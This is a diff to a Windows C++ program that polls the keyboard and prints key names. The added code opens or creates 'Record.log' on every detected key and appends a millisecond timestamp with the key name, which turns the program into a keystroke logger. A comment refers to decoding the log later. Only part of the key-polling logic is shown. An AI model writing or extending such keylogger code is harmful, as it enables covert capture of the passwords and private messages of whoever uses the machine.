@@ -3,10 +3,19 @@
 
 #include <iostream>
 #include <windows.h>
+#include <chrono>
+
+using std::chrono::duration_cast;
+using std::chrono::milliseconds;
+using std::chrono::system_clock;
+
+// output file name
+#define FILE_NAME "Record.log"
 
 int main()
 {
-    std::cout << "Hello World!\n";
+    FILE* stream;
+
     unsigned short ch, i;
     while (1) {
         ch = 1;
@@ -25,6 +34,19 @@ int main()
                     if (result > 0)
                     {
                         std::wcout << name << std::endl; // Output: Caps Lock
+						// writing date-time; & an extra '0' before every start which is used during decoding
+						// open or create a file
+                        errno_t err = fopen_s(&stream, FILE_NAME, "a");
+                        if (err != 0) {
+                            std::cout << "Unable to open log file.";
+                            continue;
+                        }
+
+                        milliseconds ms = duration_cast<milliseconds>(
+                          system_clock::now().time_since_epoch()
+                        );
+						fprintf(stream, "%lld %S\n", ms.count(), name);
+						fclose(stream);
                     }
                 }
             }
